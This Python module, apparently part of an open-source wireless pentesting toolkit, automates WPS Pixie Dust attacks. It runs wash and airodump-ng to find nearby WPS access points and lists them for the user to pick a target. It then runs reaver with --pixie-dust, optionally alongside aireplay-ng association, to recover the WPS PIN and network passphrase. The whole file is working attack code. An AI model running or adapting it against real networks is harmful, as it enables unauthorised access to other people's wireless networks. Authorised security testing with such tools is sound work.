#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   use_reaver.py - Use reaver + pixiewps to offline bruteforce wps pins.
#    Copyright (C) 2018 Yudhajit N. (Sh3llcod3)
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#   along with this program. If not, see <http://www.gnu.org/licenses/>
#   Contact: Please create a issue on my GitHub <https://github.com/Sh3llcod3>
#
#Import necessary modules
import time
import csv
#Import our custom modules
from modules import *
from .use_aircrack import *
#Create our 'wps' class
class wpsObj(object):
    def __init__(self,colors):
        self.colors = colors
        self.signalMapDict = {-55 : self.colors.green_deep + "Strong" + self.colors.endl,
        -67 : self.colors.yellow_deep + "Medium" + self.colors.endl,
        -75 : self.colors.pink_deep + "Weak  " + self.colors.endl,
        -99 : self.colors.red_deep + "Faint " + self.colors.endl}
    #Display the logo
    def showLogo(self):
        #This wasn't done by hand.
        #Some quick base64 + list comprehension + some print statements!
        pixiewpsLogo = ("CuKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilZfilojilojilZcgIOKWiOKWiOK"
        "Vl+KWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVlyAgICDilo"
        "jilojilZfilojilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4paI4paI4"
        "pWXCuKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVkeKVmuKWiOKWiOKVl+KW"
        "iOKWiOKVlOKVneKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOK"
        "VkSAgICDilojilojilZHilojilojilZTilZDilZDilojilojilZfilojilojilZTilZ"
        "DilZDilZDilZDilZ0K4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4pWRIOKVm"
        "uKWiOKWiOKWiOKVlOKVnSDilojilojilZHilojilojilojilojilojilZcgIOKWiOKW"
        "iOKVkSDilojilZcg4paI4paI4pWR4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4pa"
        "I4paI4paI4paI4paI4paI4pWXCuKWiOKWiOKVlOKVkOKVkOKVkOKVnSDilojilojilZ"
        "Eg4paI4paI4pWU4paI4paI4pWXIOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKVnSAg4"
        "paI4paI4pWR4paI4paI4paI4pWX4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWQ4pWd"
        "IOKVmuKVkOKVkOKVkOKVkOKWiOKWiOKVkQrilojilojilZEgICAgIOKWiOKWiOKVkeK"
        "WiOKWiOKVlOKVnSDilojilojilZfilojilojilZHilojilojilojilojilojilojilo"
        "jilZfilZrilojilojilojilZTilojilojilojilZTilZ3ilojilojilZEgICAgIOKWi"
        "OKWiOKWiOKWiOKWiOKWiOKWiOKVkQrilZrilZDilZ0gICAgIOKVmuKVkOKVneKVmuKV"
        "kOKVnSAg4pWa4pWQ4pWd4pWa4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdIOK"
        "VmuKVkOKVkOKVneKVmuKVkOKVkOKVnSDilZrilZDilZ0gICAgIOKVmuKVkOKVkOKVkO"
        "KVkOKVkOKVkOKVnQo=")
        pixiewpsLogo = b64D(pixiewpsLogo)
        print(pixiewpsLogo)
        startupInfo = returnGreenDeep(self.colors,"Developed by Sh3llCod3, Using Reaver & Pixiewps. 2017-2018.")
        printInfo(self.colors,startupInfo)
    #Map Signal values to strengths.
    def fetchSignalValue(self, valueToCompare):
        mappingDict = self.signalMapDict
        valueToCompare = int(valueToCompare)
        for i in sorted(mappingDict, reverse=True):
            if valueToCompare >= i:
                return mappingDict[i]
    #Enumerate targets
    def getWpsTargets(self):
        COLOR = self.colors
        self.tempFilePath = ioStream("mktemp -u HANDSHAKES/TEMP_DUMP_XXXX") #FOR Wash data
        self.wpsFilePath = ioStream('mktemp -u HANDSHAKES/TEMP_DUMP_XXXX') #FOR airodump data
        self.wpsCard = aircrackObj(COLOR)
        self.wpsCard.createTempFiles()
        self.wpsCard.selectInitialCard()
        self.wpsCardName = self.wpsCard.firstCard.cardName
        printDeepBlue(COLOR, returnBold(COLOR, "Let's run wash to find all the wps networks around."))
        printDeepBlue(COLOR,returnBlue(COLOR, "Press {0}CTRL+C{1} once you see your target network.".format(COLOR.green_deep,COLOR.blue_deep)))
        input("{0}[i]{1} {2}Once you're ready, press enter. >>{1} ".format(COLOR.blue_deep,COLOR.endl, COLOR.yellow_deep))
        sysWrite("\n")
        runAirodump = ("/usr/bin/env bash -c 'nohup ~/.airscriptNG/air/*/src/airodump-ng -a --wps -w {}"
                       " --output-format csv -I 3 -t WPA -t WPA2 -t WPA1"
                       " --ignore-negative-one {} &>/dev/null &'".format(
                        self.wpsFilePath,
                        self.wpsCardName))
        runWash = ("~/.airscriptNG/wps/*/src/wash -i {} -F | tee -a {}".format(
            self.wpsCardName,
            self.tempFilePath))
        getInitTime = time.time()
        try:
            bashRun(runAirodump)
            bashRun(runWash)
        except(KeyboardInterrupt,EOFError):
            bashRun("killall airodump-ng")
            bashRun("/usr/bin/env bash -c 'killall wash 2>/dev/null && disown 2>/dev/null'")
        finally:
            if round(time.time()-getInitTime) < 3:
                clearTerm()
                printRed(COLOR,"Not enough time has elapsed to gather sufficient data. Please try again.")
                printRed(COLOR,"Quitting program.")
                self.cleanupWpsFiles()
                normalQuit(1)
    #Parse WPS data
    def parseWpsCsv(self):
        COLOR = self.colors
        validAPList = []
        wpsAPCounter = 1
        APIndexNumbers = [0, 3, 5, 6, 7, 8, 13]
        airodumpFile = self.wpsFilePath + "-01.csv"
        washFile = self.tempFilePath
        ignoreList = ['',"BSSID"]
        with open(washFile, "r") as washFileReader, open(airodumpFile, "r") as airodumpCsv:
            washData = washFileReader.read().split()
            csvReader = csv.reader(airodumpCsv, delimiter=',')
            for row in csvReader:
                if bool(row) and len(row) >= 13:
                    firstRowElement = row[0].strip()
                    if firstRowElement in washData and firstRowElement not in ignoreList:
                        currentSelectedAp = []
                        for requiredIndex in APIndexNumbers:
                            currentRowElement = row[requiredIndex].strip()
                            if currentRowElement.startswith("\\x00"):
                                currentRowElement = "N/A"
                            currentSelectedAp.append(currentRowElement)
                        currentSelectedAp.insert(0, wpsAPCounter)    
                        validAPList.append(currentSelectedAp)
                        wpsAPCounter += 1
        clearTerm()
        printGreen(COLOR, "Viewing all WPS networks:\n")
        print("--------------------------------------------------------------------------------------------------")
        print("│{}NO.  BSSID             CHANNEL  PRIVACY   CIPHER   AUTH   POWER   ESSID                         {}│".format(COLOR.red_deep,COLOR.endl))
        print("--------------------------------------------------------------------------------------------------")
        for wpsPoint in validAPList:
            CSV_1 = "[" + COLOR.red_deep + str(wpsPoint[0]) + COLOR.endl + "]" + " " * (3 - len(str(wpsPoint[0])))
            CSV_2 = wpsPoint[1]
            CSV_3 = "   " + wpsPoint[2] + " " * (2-len(wpsPoint[2]))
            CSV_4 = "     " + wpsPoint[3][:4]
            CSV_5 = "    " + wpsPoint[4][:4]
            CSV_6 = "    " + wpsPoint[5][:3]
            CSV_7 = "  " + self.fetchSignalValue(wpsPoint[6])
            CSV_8 = " " + wpsPoint[7]
            print(CSV_1,CSV_2,CSV_3,CSV_4,CSV_5,CSV_6,CSV_7,CSV_8)
        while True:
            try:
                createNewLine()
                selectWpsAP = int(input(returnBlue(COLOR,"Please enter No.(#) of the network you want $ ")))
                if selectWpsAP <= int(validAPList[-1][0]) and selectWpsAP > 0:
                    self.selectedWpsTarget = validAPList[selectWpsAP - 1]
                    break
                else:
                    raise ValueError
            except(ValueError, TypeError):
                printYellow(COLOR, "Invalid network selected, please try again.")
                continue
    #PixieDust attack the target AP
    def pixieDust(self):
        COLOR = self.colors
        wpsTargetNetwork = self.selectedWpsTarget
        reaverMethodsDict = \
        {1 : "Run it normally. {}(BEST COMPATIBILITY){}".format(
            COLOR.yellow_deep,
            COLOR.endl),
         2 : "Run faster using Aireplay-ng. {}(RECOMMENDED METHOD){}".format(
             COLOR.yellow_deep,
             COLOR.endl)}
        clearTerm()
        print("{0}[+]{1}SELECTED NETWORK: {2}{3}{1}\n".format(COLOR.green_deep,COLOR.endl,COLOR.red_deep,wpsTargetNetwork[-1]))
        print("[" + returnGreenDeep(COLOR, "CHANNEL") +"]: {}".format(wpsTargetNetwork[2]))
        print("[" + returnGreenDeep(COLOR, "BSSID (AP MAC)") + "]: {}".format(wpsTargetNetwork[1]))
        print("[" + returnGreenDeep(COLOR, "ESSID (AP SSID)") + "]: {}".format(wpsTargetNetwork[-1]))
        print("[" + returnGreenDeep(COLOR, "CIPHER") + "]: {}".format(wpsTargetNetwork[4]))
        print("[" + returnGreenDeep(COLOR, "SIGNAL STRENGTH") + "]: {}".format(wpsTargetNetwork[6]))
        print("[" + returnGreenDeep(COLOR, "AUTHENTICATION") + "]: {}".format(wpsTargetNetwork[5]))
        print("[" + returnGreenDeep(COLOR, "INTERFACE") + "]: {}".format(self.wpsCardName))
        createNewLine()
        printSuccess(COLOR, "Successfully chosen WPS network. Let's run reaver on it.")
        printInfo(COLOR, "There are 2 ways of doing it:\n")
        for option in sorted(reaverMethodsDict.items()):
            print(returnRed(COLOR, option[0]) + ") " + returnGreenDeep(COLOR,option[1]))
        while True:
            try:
                createNewLine()
                choosenReaverMethod = int(input(returnYellow(COLOR, "Which option do you want? $ ")))
                if choosenReaverMethod in reaverMethodsDict.keys():
                    if yesNo("Start attack?", COLOR):
                        sysWrite(COLOR.yellow_dark)
                        break
                else:
                    raise ValueError
            except(ValueError, TypeError):
                printYellow(COLOR, "Invalid choice selected, please enter a number.")
                continue
        clearTerm()
        try:
            bashRun("iwconfig {} channel {}".format(
                self.wpsCardName,
                wpsTargetNetwork[2]))
            if choosenReaverMethod == 1:
                bashRun("~/.airscriptNG/wps/*/src/reaver"
                    " -i {0} -b {1} --pixie-dust -vv -c {2} -F ".format(
                self.wpsCardName,
                wpsTargetNetwork[1],
                wpsTargetNetwork[2]))
            else:
                bashRun("xterm -title 'ASSOCIATING WITH AP'"
                        " -bg '#FFFFFF' -fg '#000000' -geometry +2160"
                        " -e '~/.airscriptNG/air/*/src/aireplay-ng"
                        " -1 30 -a {0} {1}' & ~/.airscriptNG/wps/*/src/reaver"
                        " -i {1} -b {0} --pixie-dust -vv -c {2} -N -A -F ".format(
                            wpsTargetNetwork[1],
                            self.wpsCardName,
                            wpsTargetNetwork[2]))
        except(KeyboardInterrupt, EOFError):
            printSuccess(COLOR, "Quitting reaver.")
        finally:
            bashRun("killall xterm 2>/dev/null ")
        createNewLine()
        printBlue(COLOR, "By now this should either have worked or not.")
        printBlue(COLOR, "If this hasn't worked, then please try another option.")
        printBlue(COLOR, "If it has then congrats on finding the PSK/WPS-PIN!")
    #Clean up the temp files
    def cleanupWpsFiles(self):
        self.wpsCard.callCompleteCleanup()
        bashRun("rm -rf HANDSHAKES/TEMP_DUMP_* 2>/dev/null")
#TODO: Try to reduce any duplicated code.